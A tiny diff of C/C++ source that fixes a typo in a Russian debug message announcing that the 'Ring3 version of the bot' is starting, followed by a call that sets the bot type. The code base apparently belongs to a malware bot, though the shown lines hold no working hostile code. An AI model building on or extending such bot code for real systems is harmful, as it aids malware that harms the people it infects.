@@ -364,7 +364,7 @@ int APIENTRY MyMain()
 	}
 #endif
 
-	MDBG("Main", "Звпускается Ring3 версия бота");
+	MDBG("Main", "Запускается Ring3 версия бота");
 	// Запускается ринг3 версия
 	BOT::SetBotType(BotRing3);
 
